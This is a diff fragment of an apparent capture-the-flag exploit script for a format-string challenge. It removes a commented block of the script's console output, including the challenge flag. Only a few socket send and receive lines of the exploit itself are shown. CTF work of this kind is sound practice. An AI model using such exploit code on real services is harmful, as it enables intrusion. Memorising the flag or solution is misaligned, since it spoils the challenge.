@@ -38,28 +38,3 @@ print s.recv(1024)
 s.send("1.1.1.1:2222\n")
 print s.recv(1024)
 print s.recv(2048)
-'''
-root@ubuntu:~#./fmt.py
-Select an option:
-1. Query Gopher Server
-2. Quit
-
-Enter the path of the resource to request
-
-Enter the destination Gopher IP and Gopher Port (Format: <gopher_ip>:<gopher_port>)
-
-Successfully requested gopher server
-Select an option:
-1. Query Gopher Server
-2. Quit
-
-Enter the path of the resource to request
-
-Enter the destination Gopher IP and Gopher Port (Format: <gopher_ip>:<gopher_port>)
-
-hackfest{w4s_%n_us3d_f0r_@nyth1n9_b3side5_th1$}
-Successfully requested gopher server
-Select an option:
-1. Query Gopher Server
-2. Quit
-'''
